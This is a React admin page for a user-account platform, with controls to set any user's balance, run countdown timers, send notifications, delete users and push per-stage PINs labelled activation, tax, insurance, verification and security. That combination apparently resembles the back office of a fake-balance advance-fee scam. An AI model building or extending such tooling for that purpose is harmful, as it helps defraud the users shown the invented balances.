// src/pages/admin/UsersPage.jsx
import React, { useEffect, useState, useRef } from 'react';
import { adminGetUsers, adminEditUser, adminNotifyUser, adminSetPin, adminDeleteUser } from '../../services/api';
import Modal from '../../components/Modal';
import ConfirmDialog from '../../components/ConfirmDialog';
import '../styles/userspage.css';

export default function UsersPage() {
  const [users, setUsers] = useState([]);
  const [loading, setLoading] = useState(true);
  const [selected, setSelected] = useState(null);
  const [editBalance, setEditBalance] = useState('');
  const [modalOpen, setModalOpen] = useState(false); // edit balance modal
  const [confirmOpen, setConfirmOpen] = useState(false);
  const [confirmPayload, setConfirmPayload] = useState(null);
  const [info, setInfo] = useState('');

  // set-pin modal states
  const [setPinOpen, setSetPinOpen] = useState(false);
  const [setPinUser, setSetPinUser] = useState(null);
  const [setPinStage, setSetPinStage] = useState('activation');
  const [setPinValue, setSetPinValue] = useState('');

  // timer remaining display
  const [timeRemaining, setTimeRemaining] = useState(null);
  const timerRef = useRef(null);

  const load = async () => {
    try {
      setLoading(true);
      const res = await adminGetUsers();
      // Sort users by registration date (newest first)
      const sortedUsers = (res.data || []).sort((a, b) => new Date(b.createdAt) - new Date(a.createdAt));
      setUsers(sortedUsers);
    } catch (err) {
      console.error(err);
      alert(err?.response?.data?.message || 'Failed to load users');
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => { load(); }, []);

  // update timeRemaining when selected changes
  useEffect(() => {
    if (timerRef.current) {
      clearInterval(timerRef.current);
      timerRef.current = null;
    }

    if (!selected) {
      setTimeRemaining(null);
      return;
    }

    const update = () => {
      if (!selected.timerEnds) {
        setTimeRemaining(null);
        return;
      }
      const ms = new Date(selected.timerEnds).getTime() - Date.now();
      if (ms <= 0) {
        setTimeRemaining('Expired');
        return;
      }
      const sec = Math.floor(ms / 1000);
      const d = Math.floor(sec / (3600 * 24));
      const h = Math.floor((sec % (3600 * 24)) / 3600);
      const m = Math.floor((sec % 3600) / 60);
      const s = sec % 60;
      const parts = [];
      if (d) parts.push(`${d}d`);
      parts.push(String(h).padStart(2, '0'));
      parts.push(String(m).padStart(2, '0'));
      parts.push(String(s).padStart(2, '0'));
      setTimeRemaining(parts.join(':'));
    };

    update();
    timerRef.current = setInterval(update, 1000);

    return () => {
      if (timerRef.current) {
        clearInterval(timerRef.current);
        timerRef.current = null;
      }
    };
  }, [selected]);

  const openEdit = (user) => {
    setSelected(user);
    setEditBalance(String(user.balance || 0));
    setModalOpen(true);
    setInfo('');
  };

  const saveUser = async () => {
    if (!selected) return;
    const num = Number(editBalance);
    if (Number.isNaN(num)) return alert('Invalid balance');
    try {
      await adminEditUser(selected._id, { balance: num });
      setInfo('Saved');
      setModalOpen(false);
      await load();
      // refresh selected object from the latest list
      const refreshed = users.find(u => u._id === selected._id) || null;
      setSelected(refreshed);
    } catch (err) {
      console.error(err);
      alert(err?.response?.data?.message || 'Save failed');
    }
  };

  const startStopTimer = (action) => {
    if (!selected) { alert('Select user first'); return; }
    setConfirmPayload({ type: 'timer', userId: selected._id, action });
    setConfirmOpen(true);
  };

  const handleConfirm = async () => {
    try {
      if (!confirmPayload) return;
      await adminEditUser(confirmPayload.userId, { action: confirmPayload.action });
      await load();
      setInfo(confirmPayload.action === 'startTimer' ? 'Timer started' : 'Timer stopped');
      // update selected user details
      const refreshed = users.find(u => u._id === confirmPayload.userId) || null;
      setSelected(refreshed);
    } catch (err) {
      console.error(err);
      alert('Failed');
    } finally {
      setConfirmPayload(null);
      setConfirmOpen(false);
    }
  };

  const handleNotify = async () => {
    if (!selected) return alert('Select a user to notify');
    const text = prompt('Enter notification text');
    if (!text) return;
    try {
      await adminNotifyUser(selected._id, text);
      alert('Notification sent');
    } catch (err) {
      console.error(err);
      alert('Failed to send notification');
    }
  };

  // Delete user
  const handleDeleteUser = async (user) => {
    if (!user) return;
    const ok = window.confirm(`Delete user ${user.username} and all their data? This action cannot be undone.`);
    if (!ok) return;
    try {
      await adminDeleteUser(user._id);
      alert('User deleted');
      // reload list and clear selection if needed
      await load();
      if (selected && selected._id === user._id) setSelected(null);
    } catch (err) {
      console.error(err);
      alert(err?.response?.data?.message || 'Failed to delete user');
    }
  };

  // Open set-pin modal for a user
  const openSetPinForUser = (user) => {
    setSetPinUser(user);
    setSetPinStage('activation');
    setSetPinValue('');
    setSetPinOpen(true);
  };

  const submitSetPin = async () => {
    if (!setPinUser) return;
    if (!setPinStage) return alert('Select a stage');
    if (!setPinValue || setPinValue.length !== 4) return alert('Please enter a 4-digit pin');
    try {
      await adminSetPin(setPinUser._id, setPinStage, setPinValue);
      alert(`Pin set for ${setPinStage}`);
      setSetPinOpen(false);
      await load();
      // refresh selected if it was the same user
      if (selected && selected._id === setPinUser._id) {
        const refreshed = users.find(u => u._id === selected._id) || null;
        setSelected(refreshed);
      }
    } catch (err) {
      console.error(err);
      alert(err?.response?.data?.message || 'Failed to set pin');
    }
  };

  const toggleUserSelection = (user) => {
    if (selected && selected._id === user._id) {
      setSelected(null);
    } else {
      setSelected(user);
      setEditBalance(String(user.balance || 0));
    }
  };

  return (
    <div className="admin-page card">
      <h2>Users</h2>
      <div className="users-container">
        {loading ? <div>Loading...</div> : (
          <div className="users-list">
            {users.map(u => (
              <div key={u._id} className={`user-card ${selected && selected._id === u._id ? 'selected' : ''}`}>
                <div className="user-header">
                  <div className="user-info">
                    <div className="user-name">{u.username}</div>
                    <div className="muted">{u.email} • {u.country}</div>
                    <div className="user-balance">${Number(u.balance || 0).toFixed(2)}</div>
                  </div>
                  <div className="user-actions">
                    <button className="btn-outline small" onClick={() => openEdit(u)}>Edit</button>
                    <button className="btn-outline small" onClick={() => { setSelected(u); handleNotify(); }}>Notify</button>
                    <button className="btn-outline small" onClick={() => openSetPinForUser(u)}>Set Pin</button>
                    <button 
                      className={`btn-outline small ${selected && selected._id === u._id ? 'active' : ''}`}
                      onClick={() => toggleUserSelection(u)}
                    >
                      {selected && selected._id === u._id ? 'Hide' : 'Show'}
                    </button>
                    <button className="btn-outline small danger" onClick={() => handleDeleteUser(u)}>Delete</button>
                  </div>
                </div>
                
                {selected && selected._id === u._id && (
                  <div className="user-details">
                    <div className="details-grid">
                      <div className="detail-item">
                        <strong>Username:</strong> {selected.username}
                      </div>
                      <div className="detail-item">
                        <strong>Email:</strong> {selected.email}
                      </div>
                      <div className="detail-item">
                        <strong>Country:</strong> {selected.country}
                      </div>
                      <div className="detail-item">
                        <strong>Role:</strong> {selected.role}
                      </div>
                      
                      <div className="detail-item full-width">
                        <strong>Timer:</strong>
                        <div className="muted">
                          {selected.timerActive ? 
                            `Active • Ends: ${selected.timerEnds ? new Date(selected.timerEnds).toLocaleString() : '—'}` : 
                            'Inactive'
                          }
                        </div>
                        {selected.timerActive && (
                          <div className="timer-remaining">
                            Time remaining: {timeRemaining || 'Calculating...'}
                          </div>
                        )}
                      </div>

                      <div className="detail-item full-width">
                        <label className="label">Balance</label>
                        <input 
                          className="input" 
                          value={editBalance} 
                          onChange={(e) => setEditBalance(e.target.value)} 
                        />
                      </div>

                      <div className="detail-item full-width actions-row">
                        <button className="btn" onClick={saveUser}>Save Balance</button>
                        <button className="btn-outline" onClick={() => startStopTimer('startTimer')}>Start Timer</button>
                        <button className="btn-outline" onClick={() => startStopTimer('stopTimer')}>Stop Timer</button>
                        <button className="btn-outline" onClick={() => handleNotify()}>Send Notification</button>
                        <button className="btn-outline" onClick={() => openSetPinForUser(selected)}>Set Pin</button>
                      </div>

                      {info && (
                        <div className="detail-item full-width">
                          <div className="info-message">{info}</div>
                        </div>
                      )}
                    </div>
                  </div>
                )}
              </div>
            ))}
          </div>
        )}
      </div>

      <Modal isOpen={modalOpen} title="Edit user" onClose={() => setModalOpen(false)} footer={
        <div style={{ display:'flex', gap:8 }}>
          <button className="btn-outline" onClick={() => setModalOpen(false)}>Cancel</button>
          <button className="btn" onClick={saveUser}>Save</button>
        </div>
      }>
        {selected && (
          <div style={{ display: 'grid', gap: 8 }}>
            <div><strong>{selected.username}</strong></div>
            <div className="muted">Email: {selected.email}</div>
            <label className="label">Balance</label>
            <input className="input" value={editBalance} onChange={(e) => setEditBalance(e.target.value)} />
          </div>
        )}
      </Modal>

      {/* Set Pin modal */}
      <Modal isOpen={setPinOpen} title={setPinUser ? `Set pin for ${setPinUser.username}` : 'Set pin'} onClose={() => setSetPinOpen(false)} footer={
        <div style={{ display:'flex', gap:8 }}>
          <button className="btn-outline" onClick={() => setSetPinOpen(false)}>Cancel</button>
          <button className="btn" onClick={submitSetPin}>Set Pin</button>
        </div>
      }>
        {setPinUser && (
          <div style={{ display: 'grid', gap: 8 }}>
            <div><strong>{setPinUser.username}</strong></div>
            <label className="label">Stage</label>
            <select className="input" value={setPinStage} onChange={(e) => setSetPinStage(e.target.value)}>
              <option value="activation">Activation</option>
              <option value="tax">Tax</option>
              <option value="insurance">Insurance</option>
              <option value="verification">Verification</option>
              <option value="security">Security</option>
            </select>
            <label className="label">4-digit pin</label>
            <input className="input" value={setPinValue} onChange={(e) => setSetPinValue(e.target.value.replace(/\D/g, '').slice(0,4))} placeholder="e.g. 1234" />
            <div className="muted" style={{ fontSize: 13 }}>
              Pins are set per-stage. Setting a pin will push it to the user's dashboard notifications.
            </div>
          </div>
        )}
      </Modal>

      <ConfirmDialog
        isOpen={confirmOpen}
        title="Confirm action"
        message={confirmPayload?.type === 'timer' ? `Are you sure you want to ${confirmPayload?.action === 'startTimer' ? 'start' : 'stop'} the timer?` : 'Proceed?'}
        onConfirm={handleConfirm}
        onCancel={() => { setConfirmOpen(false); setConfirmPayload(null); }}
      />
    </div>
  );
}
